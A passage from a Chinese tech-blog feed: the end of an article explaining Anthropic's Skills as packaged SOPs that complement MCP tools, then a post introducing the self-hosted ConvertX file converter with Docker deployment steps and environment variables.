<p>在 MCP 这种模式里，数据的传递方式说白了有点像“人工搬家”，而且是用手扛着着一整套沙发从一楼爬到二十楼那种笨办法：</p>
<p><strong>(1）读取时怎么做：</strong> 模型先调用 Drive 工具，Drive 不管三七二十一，把一份长达 2 万字的会议纪要<strong>整份</strong>塞进模型的上下文窗口里。</p>
<p><strong>(2）写入时怎么做：</strong> 模型把这份长文档读完后，又调用 Salesforce 工具，然后把这<strong>2 万字原封不动当作参数</strong>再塞进去，重新发送一遍。</p>
<p>结果就是：<strong>又贵、又卡、还容易出错。</strong></p>
<ul>
<li>
<p><strong>Token 花费翻倍（贵）：</strong></p>
<p>比如一场 2 小时的销售会议，转录文本可能就有 50,000 个 Token。现在等于“进一次、出一次”，模型要处理两遍大文本，额外多吃掉 100,000+ Token，成本直接飙升。</p>
</li>
<li>
<p><strong>上下文容易爆掉（卡）：</strong></p>
<p>就算是支持长上下文的模型，遇到更大的文档或更复杂的数据结构，也可能一下子把窗口塞满，导致流程跑到一半直接中断。</p>
</li>
<li>
<p><strong>稳定性变差（错）：</strong></p>
<p>模型在“手动搬运”海量内容时，就像人 copy-paste 大段文字一样，容易出现<strong>幻觉、漏内容、被截断、格式乱</strong>等问题。</p>
</li>
</ul>
<p>这种做法不仅让 Token 消耗暴涨（成本更高），还会因为上下文太长、信息太多而分散模型注意力，让它在真正需要思考的关键逻辑上反而“变笨”。</p>
<h4 data-id="heading-2">2). 定位缺失：工具和方法“没连起来”</h4>
<p>MCP 的核心作用，是把“怎么调用工具”这件事统一成一套标准协议。它最初要解决的问题很现实：如果有N个模型、M 个工具，两两适配会变得特别复杂。</p>
<p>但问题在于：MCP 只规定了“手怎么用工具”（调用方式），却没规定“脑子怎么把事情做完”（业务流程/SOP 怎么编排）。</p>
<p>所以在当前常见架构里，就算 Dify、n8n 这类平台能很方便把 MCP 接进来当“工具库”，真正的业务逻辑往往还是：</p>
<ul>
<li>藏在大模型的“隐性经验”里（靠模型临场发挥），或</li>
<li>写死在人工配置/硬编码的工作流里。</li>
</ul>
<p>结果就是：工具本身是“被动提供能力”的，但“怎么组合这些工具完成复杂任务”，缺少一个统一、标准的承载方式。</p>
<h4 data-id="heading-3">3). 怎么补这个空？Anthropic 用 Skills 给出答案</h4>
<p>为了解决“有工具但缺流程标准”的问题，Anthropic 提出了<strong>Skills（技能）</strong> 。</p>
<p>你可以把 Skill 理解成：<strong>把某件事做好的标准操作方法（SOP）打包成一个可复用模块</strong>。</p>
<p>打个比方：</p>
<ul>
<li>大模型像厨师，</li>
<li>工具像锅碗瓢盆和灶台，</li>
<li>Skill 就像一道菜的“标准菜谱”：什么时候切菜、先炒什么、火候多少、用哪些厨具——都写清楚。</li>
</ul>
<p>因此，Skill 的本质是<strong>标准化的 SOP 沉淀</strong>：不仅说明“要做什么”，还把“怎么做、需要哪些资源”一起封装进去。</p>
<p>对比一下变化会更直观：</p>
<ul>
<li><strong>过去</strong>：因为模型理解有限，业务流程通常只能用 Python/JS 或 Dify 的 YAML 这类方式“硬编码”出来。</li>
<li><strong>现在</strong>：模型理解力更强后，很多流程可以直接用自然语言描述；非程序员也能把自己的经验固化成可复用的流程模块。类似思路早期在 OpenAI 的 GPTs 上出现过，但 Skill 更强调“工程化与标准化”——不局限在某个聊天产品里，而是能成为 Agent 可调用的基础能力单元。</li>
</ul>
<hr/>
<h3 data-id="heading-4">核心理念：别一股脑塞给 AI，要“按需投喂”</h3>
<p>虽然现在的 AI 记性越来越好（上下文窗口变大），但如果你把成吨的信息一次性全倒给它，AI 也会“大脑过载”，不仅容易胡言乱语、抓不住重点，而且还特别费钱。</p>
<p>所以，Skill 的设计思路就像**“剥洋葱”<strong>或者</strong>“看菜单”**：<strong>不问不给，问到哪层给哪层</strong>。这种专业术语叫“渐进式披露”，说白了就是：<strong>只在最需要的时候，给最关键的信息。</strong></p>
<p>为了实现这一点，Skill 把信息分成了三层：</p>
<h4 data-id="heading-5">第一层：店招/名片（元数据层 —— 始终亮着）</h4>
<ul>
<li><strong>作用：</strong> 告诉 AI “我是干嘛的”。</li>
<li><strong>内容：</strong> 只有技能的名字和一句话简介。</li>
<li><strong>好处：</strong> 就像店门口的招牌，AI 一眼就能扫到，占用的“脑力”（Token）极少，非常省钱。</li>
</ul>
<h4 data-id="heading-6">第二层：操作手册（指令层 —— 选中后再看）</h4>
<ul>
<li><strong>作用：</strong> 告诉 AI “这事儿具体怎么办”。</li>
<li>**内容：**详细的步骤、规矩和工作流程（比如<code>SKILL.md</code> 文件）。</li>
<li><strong>好处：</strong> 只有当 AI 确定要用这个技能时，才会去读这份手册。这样它能集中注意力，把事儿办得更稳妥。</li>
</ul>
<h4 data-id="heading-7">第三层：工具箱/大仓库（资源层 —— 干活时才开）</h4>
<ul>
<li><strong>作用：</strong> 给 AI 真正干活用的“原材料”。</li>
<li><strong>内容：</strong> 复杂的代码脚本、厚厚的参考文档、庞大的数据模板。</li>
<li><strong>好处：</strong> 这是最占内存、最费钱的部分。所以，只有当 AI 真正开始动手干活、非用不可时，才会去仓库里取。</li>
</ul>
<h3 data-id="heading-8">Skill 的标准结构：一个有序的“工作间”</h3>
<p>一个标准的 Skill 通常会按“文件夹 + 文件”的方式来组织。你可以把它想成：<strong>一个技能包</strong>，里面把“说明书、工具、资料、素材”分门别类放好，结构大概是这样：</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">my</span>-skill/
├── SKILL.md          <span class="hljs-comment"># [必需] 核心大脑。包含元数据（name、description）和自然语言编写的指令流程</span>
├── scripts/          <span class="hljs-comment"># [可选] 执行手脚。存放 Python/Bash 等可执行代码，封装复杂逻辑</span>
├── references/       <span class="hljs-comment"># [可选] 知识库。存放模型决策所需的参考文档、API 手册等</span>
└── assets/           <span class="hljs-comment"># [可选] 静态资源。存放输出报告所需的模板、图片、示例数据等</span>
</code></pre>
<p>这种分层设计有什么好处？</p>
<ul>
<li>
<p><strong>更省 Token、上下文更“干净”</strong></p>
<p>模型不会一上来就把所有内容都读进来：</p>
<p>先只看<code>SKILL.md</code>里的元信息来判断“要不要用这个技能”；决定要用之后再读具体流程；真正执行时才去加载<code>scripts</code>或<code>references</code>。</p>
<p>这样可以有效避免上下文越堆越大。</p>
<p>也能解决“中间工具结果把 token 吃光”的问题：在 Skill 模式下，模型更多是<strong>下指令让脚本去干活</strong>，比如脚本直接从 Google Drive 拉数据并写进 Salesforce，大段会议记录根本不需要塞进模型的上下文窗口。</p>
</li>
<li>
<p><strong>更稳定、更不容易出错（鲁棒性更强）</strong></p>
<p>把复杂、常用、容易踩坑的操作封装进<code>scripts</code>，就不需要模型每次都“现场写代码、现场调试”。</p>
<p>结果就是：<strong>幻觉更少、错误更少、执行更一致</strong>。</p>
<p>这也符合很多工具型产品的思路：把高频且容易错的部分固化成“工具/代码”，把需要灵活判断的部分留给模型来做。</p>
</li>
</ul>
<h3 data-id="heading-9">简单三步，上手使用 Skill</h3>
<p>使用 Skill 的过程非常直观，就像给你的 AI 助手安装了一个“功能插件”。</p>
<h4 data-id="heading-10">1). 怎么安装？</h4>
<p>你不需要复杂的配置，只需要把写好的<code>skills</code>文件夹，像放文件一样丢进特定的目录即可。</p>
<p>通常有两个地方可以选择：</p>
<ul>
<li><strong>全局有效：</strong> 放在你电脑的用户目录下。</li>
<li>**项目有效：**放在你当前工作项目的根目录下，路径通常是<code>.claude/skills</code>。</li>
</ul>
<h4 data-id="heading-11">2). 怎么运行？</h4>
<p>如果你习惯用命令行，直接使用<strong>Claude Code</strong>工具就能调用。如果你更喜欢在编译器里操作，比如<strong>Cursor</strong>或<strong>VS Code</strong>，只要符合文件规范，AI 就能自动识别并学会这个新技能。</p>
<h4 data-id="heading-12">3). 举个例子：做一份红烧肉</h4>
<p>开发一个 Skill 到底有多简单？以“教 AI 做红烧肉”为例：你只需要写清楚步骤和逻辑，保存成文件即可。</p>
<p>这种方式带来了一个巨大的变化—— <strong>“配置即代码”</strong> ：</p>
<ul>
<li><strong>以前：</strong> 你可能需要在 Dify 这种可视化平台上，像连连看一样拉很多线条、点很多按钮来设计工作流。</li>
<li><strong>现在：</strong> 你只需要写一段结构化的文字（代码）。</li>
</ul>
<h4 data-id="heading-13">这样做有什么好处？</h4>
<ul>
<li><strong>管理方便：</strong> 像管理代码文件一样，你可以随时查看修改记录（版本管理）。</li>
<li><strong>轻松分享：</strong> 把文件发给同事，他粘贴到文件夹里就能直接用。</li>
<li><strong>随处复用：</strong> 同样的功能，可以在不同的项目中无缝切换。</li>
</ul>
<p>就一句话，Skill 让 AI 的能力变得“模块化”了——<strong>写完即用，复制即学会。</strong></p>
<h3 data-id="heading-14">后记</h3>
<p>这几个月里，开发者社区一直在分享各种 MCP 工具，大家主要是在解决“怎么把手伸出去干活”的问题——也就是让模型能调用工具、访问资源、完成具体操作。</p>
<p>但从现在开始、以及接下来一段时间，<strong>Skill 很可能会成为的方向</strong>。因为它不只解决“手”，更在解决两件更关键的事：<strong>怎么思考（脑）</strong> ，以及<strong>怎么把事情按步骤做完（流程）</strong> 。</p>
<p>更重要的是，Skill 不只是把工具和资源“收纳起来”，它还能把一套做事方法<strong>标准化、流程化</strong>。当大模型的推理能力越来越强，Skill 就像补上了“自主智能体”拼图里那块最关键的缺口——让它不止会做事，还会<strong>按正确的方法持续把事做成</strong>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ConvertX:一站式自托管在线文件转换平台,支持上千种格式]]></title>    <link>https://juejin.cn/post/7597283981185302580</link>    <guid>https://juejin.cn/post/7597283981185302580</guid>    <pubDate>2026-01-20T15:27:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597283981185302580" data-draft-id="7597326073671696399" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ConvertX:一站式自托管在线文件转换平台,支持上千种格式"/> <meta itemprop="keywords" content="开源"/> <meta itemprop="datePublished" content="2026-01-20T15:27:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="修己xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ConvertX:一站式自托管在线文件转换平台,支持上千种格式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    修己xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:27:48.000Z" title="Tue Jan 20 2026 15:27:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你是否曾经为了转换一个文件格式，在电脑上安装各种臃肿的软件，或者将敏感文件上传到第三方在线转换网站？如果你正在寻找一个既能保护隐私、又能满足多样化转换需求的自托管解决方案，那么 <strong>ConvertX</strong> 就是为你量身打造的工具。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15f6b2448cc9445f9d75f3b7a3f5422c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=lL6fsv%2F5SE66WalF0UHKsf9psT8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">💥什么是 ConvertX？</h2>
<p>ConvertX 是一个功能强大的自托管在线文件转换器。它最大的亮点是 <strong>支持超过一千种不同的文件格式转换</strong>，涵盖了文档、图像、视频、电子书、3D模型等多种类型。该项目采用 TypeScript、Bun 和 Elysia 等现代技术栈开发，旨在为用户提供一个安全、高效、可完全掌控的本地化文件处理中心。</p>
<p>github地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FC4illin%2FConvertX" target="_blank" title="https://github.com/C4illin/ConvertX" ref="nofollow noopener noreferrer">github.com/C4illin/Con…</a></p>
<p>该项目在github 已有15.3k ⭐star</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd5050a58bae45e2b6d5def2beb1f798~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=%2F6IX8CnFDJs6nnPqDKgI%2Bi%2BtU%2F0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">☀️ 核心特性</h2>
<ul>
<li><strong>海量格式支持：</strong> 支持上千种格式互转，几乎能满足所有日常及专业需求。</li>
<li><strong>批量处理：</strong> 可以一次性上传并转换多个文件，显著提升工作效率。</li>
<li><strong>隐私安全：</strong> 自托管意味着你的文件数据永远不会离开你自己的服务器，非常适合处理敏感或机密文档。</li>
<li><strong>多用户账户：</strong> 支持为团队成员或家庭成员创建独立的账户，共享服务又保持个人文件历史隔离。</li>
<li><strong>开源免费：</strong> 完全开源，代码透明，可自由部署和修改。</li>
</ul>
<h2 data-id="heading-2">🎠强大的转换引擎阵容</h2>
<p>ConvertX 的强大能力源于其背后整合的众多业界知名的开源转换工具，它们共同构成了一个超级转换工厂：</p>

































































<table><thead><tr><th>工具</th><th>用途</th><th>支持输入格式数</th><th>支持输出格式数</th></tr></thead><tbody><tr><td><strong>FFmpeg</strong></td><td>音视频处理</td><td>~472种</td><td>~199种</td></tr><tr><td><strong>ImageMagick / GraphicsMagick</strong></td><td>图像处理</td><td>412种</td><td>313种</td></tr><tr><td><strong>LibreOffice</strong></td><td>办公文档</td><td>41种</td><td>22种</td></tr><tr><td><strong>Pandoc</strong></td><td>文档格式（如Markdown）</td><td>43种</td><td>65种</td></tr><tr><td><strong>Calibre</strong></td><td>电子书</td><td>26种</td><td>19种</td></tr><tr><td><strong>Inkscape</strong></td><td>矢量图形</td><td>7种</td><td>17种</td></tr><tr><td><strong>Assimp</strong></td><td>3D模型资产</td><td>77种</td><td>23种</td></tr><tr><td><strong>Vips / libheif / libjxl</strong></td><td>高性能图像与HEIF/JPEG XL格式</td><td>58种</td><td>38种</td></tr><tr><td>... 以及更多</td><td>包括 SVG、LaTeX、Outlook邮件、联系人文件等</td><td/><td/></tr></tbody></table>
<p>这个列表清晰地展示了 ConvertX 的格式覆盖广度。无论是常见的 <code>.pdf</code>、<code>.docx</code>、<code>.mp4</code>、<code>.jpg</code>，还是相对小众的格式，它都有很大可能支持。</p>
<h2 data-id="heading-3">🏍️快速部署指南</h2>
<p>使用 Docker 部署 ConvertX 是极其简单的过程，只需几分钟即可拥有自己的转换服务。</p>
<ol>
<li><strong>准备 <code>docker-compose.yml</code> 文件：</strong></li>
</ol>

<pre><code class="hljs language-ini" lang="ini">services:
  convertx:
  <span class="hljs-comment"># 此服务的镜像3.59GB，国内下载比较慢，需要的家人们可以使用我转存阿里云镜像仓库的镜像</span>
    image: registry.cn-hangzhou.aliyuncs.com/xjpublic/convertx
    container_name: convertx
    restart: unless-stopped
    ports:
      - "10000:3000"
    environment: 
      - <span class="hljs-attr">ACCOUNT_REGISTRATION</span>=<span class="hljs-literal">false</span> <span class="hljs-comment"># true或false，首账户创建不受影响（例如若只需单账户可保持false）</span>
      - <span class="hljs-attr">JWT_SECRET</span>=aLongAndSecretStringUsedToSignTheJSONWebToken1234 <span class="hljs-comment"># 默认使用randomUUID()生成</span>
      - <span class="hljs-attr">HTTP_ALLOWED</span>=<span class="hljs-literal">true</span> <span class="hljs-comment"># 若要使用http访问，则设置为true</span>
      - <span class="hljs-attr">ALLOW_UNAUTHENTICATED</span>=<span class="hljs-literal">true</span>  <span class="hljs-comment"># 允许未登录用户使用服务，仅限本地环境设为true</span>
      - <span class="hljs-attr">AUTO_DELETE_EVERY_N_HOURS</span>=<span class="hljs-number">24</span> <span class="hljs-comment"># 每N小时检查并删除超过N小时的旧文件，设为0可禁用</span>
    volumes:
      - ./data:/app/data
</code></pre>
<p>🐳<strong>Docker 镜像</strong></p>
<p>每次发布时会更新 <code>:latest</code> 标签，每次推送到主分支时会更新 <code>:main</code> 标签。常规使用推荐使用 <code>:latest</code> 标签。</p>
<p>镜像可在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FC4illin%2FConvertX%2Fpkgs%2Fcontainer%2FConvertX" target="_blank" title="https://github.com/C4illin/ConvertX/pkgs/container/ConvertX" ref="nofollow noopener noreferrer">GitHub Container Registry</a> 和 <a href="https://link.juejin.cn?target=https%3A%2F%2Fhub.docker.com%2Fr%2Fc4illin%2Fconvertx" target="_blank" title="https://hub.docker.com/r/c4illin/convertx" ref="nofollow noopener noreferrer">Docker Hub</a> 获取。</p>

























<table><thead><tr><th>镜像</th><th>说明</th></tr></thead><tbody><tr><td><code>image: ghcr.io/c4illin/convertx</code></td><td>GitHub Container Registry 上的最新发布版本</td></tr><tr><td><code>image: ghcr.io/c4illin/convertx:main</code></td><td>GitHub Container Registry 上的最新提交</td></tr><tr><td><code>image: c4illin/convertx</code></td><td>Docker Hub 上的最新发布版本</td></tr><tr><td><code>image: c4illin/convertx:main</code></td><td>Docker Hub 上的最新提交</td></tr></tbody></table>
<p>此服务的镜像3.59GB，国内下载比较慢，需要的家人们可以使用我转存阿里云镜像仓库的镜像<code>registry.cn-hangzhou.aliyuncs.com/xjpublic/convertx</code></p>
<ol start="2">
<li>
<p><strong>启动服务：</strong></p>
<p>在 <code>docker-compose.yml</code> 文件所在目录下运行：</p>
</li>
</ol>

<pre><code class="hljs">docker-compose up -d
</code></pre>
<p>3.  <strong>初始化账户：</strong> 在浏览器中访问 <code>http://你的服务器IP:3000</code>。<strong>第一个注册的用户将自动成为管理员</strong>。</p>
<p>就这么简单！你已经成功搭建了一个功能完备的在线文件转换平台。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea5e412ffef949c0b361cf4a406093d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=GGHqYDL9Q1atciNfvU7RE%2FWxW2A%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e959a7762eb45e7bf30d155dc3f513e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=n5K9tEYwr%2FdvSY%2BM79RURKu%2BsRQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">🛞环境变量</h3>
<p>所有变量均为可选，但建议设置 JWT_SECRET。</p>






































































<table><thead><tr><th>变量名</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>JWT_SECRET</td><td>未设置时使用 randomUUID() 生成的值</td><td>用于签名 JSON Web Token 的长而保密的字符串</td></tr><tr><td>ACCOUNT_REGISTRATION</td><td>false</td><td>是否允许用户注册账户</td></tr><tr><td>HTTP_ALLOWED</td><td>false</td><td>是否允许 HTTP 连接，仅在本地环境中设置为 true</td></tr><tr><td>ALLOW_UNAUTHENTICATED</td><td>false</td><td>是否允许未认证用户使用服务，仅在本地环境中设置为 true</td></tr><tr><td>AUTO_DELETE_EVERY_N_HOURS</td><td>24</td><td>每隔 n 小时检查并删除超过 n 小时的文件，设置为 0 以禁用</td></tr><tr><td>WEBROOT</td><td/><td>根路径地址，例如设置为 "/convert" 后，网站将通过 "example.com/convert/" 访问</td></tr><tr><td>FFMPEG_ARGS</td><td/><td>传递给 ffmpeg 输入文件的参数，例如 <code>-hwaccel vaapi</code>。有关硬件加速的更多信息，请参阅 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FC4illin%2FConvertX%2Fissues%2F190%25E3%2580%2582" target="_blank" title="https://github.com/C4illin/ConvertX/issues/190%E3%80%82" ref="nofollow noopener noreferrer">github.com/C4illin/Con…</a></td></tr><tr><td>FFMPEG_OUTPUT_ARGS</td><td/><td>传递给 ffmpeg 输出文件的参数，例如 <code>-preset veryfast</code></td></tr><tr><td>HIDE_HISTORY</td><td>false</td><td>是否隐藏历史记录页面</td></tr><tr><td>LANGUAGE</td><td>en</td><td>用于格式化日期字符串的语言，需使用 [BCP 47 语言标签] 指定</td></tr><tr><td>UNAUTHENTICATED_USER_SHARING</td><td>false</td><td>是否在所有未认证用户之间共享转换历史记录</td></tr><tr><td>MAX_CONVERT_PROCESS</td><td>0</td><td>允许的最大并发转换进程数。设置为 0 表示无限制。</td></tr></tbody></table>
<h2 data-id="heading-5">🌅总结</h2>
<p><strong>ConvertX 完美地解决了一个核心痛点：在保障数据隐私的前提下，提供堪比甚至超越商业云服务的文件格式转换能力。</strong> 无论你是个人用户，想要一个干净、无广告、不限次数的本地转换工具；还是团队或组织，需要在内网部署一个安全的文件处理服务，ConvertX 都是一个极具吸引力的选择。</p>
<p>其基于 Docker 的一键式部署、详尽的配置选项和活跃的开源生态，使得从试用、部署到长期维护都变得非常轻松。如果你厌倦了在多个在线转换网站间跳转，或是对云服务的数据安全心存顾虑，不妨现在就尝试部署一个属于你自己的 ConvertX。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d73106e49464640808061ad601a1975~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=EcJVtGJWS5pP1yYFOojreSlynl0%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Agent Skill 学习笔记]]></title>    <link>https://juejin.cn/post/7597278451029786634</link>    <guid>https://juejin.cn/post/7597278451029786634</guid>    <pubDate>2026-01-20T15:27:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597278451029786634" data-draft-id="7597266141912694830" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Agent Skill 学习笔记"/> <meta itemprop="keywords" content="程序员"/> <meta itemprop="datePublished" content="2026-01-20T15:27:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="KaneLogger"/> <meta itemprop="url" content="https://juejin.cn/user/3650034333917031"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Agent Skill 学习笔记
